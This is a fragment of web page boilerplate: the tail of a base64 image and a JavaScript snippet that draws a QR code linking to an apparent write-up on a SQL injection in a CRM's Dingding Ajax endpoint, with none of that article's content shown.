GM9b0O4sOI5gp779JqQWq6D6MO4RCs2loQbj3MOUSHoPmO1bOWOiQPXP8ecnuz1+GvLLhPC9i2WxPdL2D6tT5Eh6AN9rX7a31RD1IPQXVzM4RkYURrxV6rLn7VN2+9qC6qQ/bX9fIPAzF04WtOYPsqq9++plWr65Dpller+6Xtlz6krnOIbg2EmxPhsQ4Y3bD3BD7f1RDcgu3iXpccjKjfyobewGYDg2e9CHf/eodsx/YeF9tXWU5LXG2v+3CfLhyv7WMdJKMuQnRzKzS/8ks38yxC7t3z1Wu2ek4+y5amv8LKuK53yOqUXqRvnyGQpwSeQ/frZDvqQ/rJV2g9JA9z7PVwz628rp9xuPeE+7V1EM09q4sQX94RRh/Cgev7kNubvba/spz2Gfb9Q6bbdbn9IDl5Rxj9Xm9eXVQvVBNLqyXvWF4tdcge5OXtF4y+uY7WdF3efXnhNhDDF772BA4DgTwFMOJqmzXVWvBc/tk+5iB95SJEhyOaWWHttxaktq5r9TzEh+DKV4fkYET9ukctmPuVOwykxGu97gT++UDqCai1+iPB+HTAyKu21qpevTKrZQbSu+f0RRhz6mdoX3NnHHKfnofowPVV1u3NXv/8HQKZdn9a/HOrd9QXV7465D5wRDP2gmQ6NyfCmFPvaJ+OMNZDuPXm5RBfvfCfD6SaXuv7J3AYiNPr+N1bQJ4C+0H4s/1gnrffHu0JqdHrulyEMd/rek7+Vex9O69+h4GUeK3XncA2EMhTAo9xtVWnLUL6rPIw9yE6BO1nH4gORzQjQjK9R+fmRUhd59aJ+vIVmoOxr/oet4Hsxev6dSdwDeR1Zz+9838AAAD//1tebrcAAAAGSURBVAMAVVB2vJ2/m5kAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxProductionTask-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 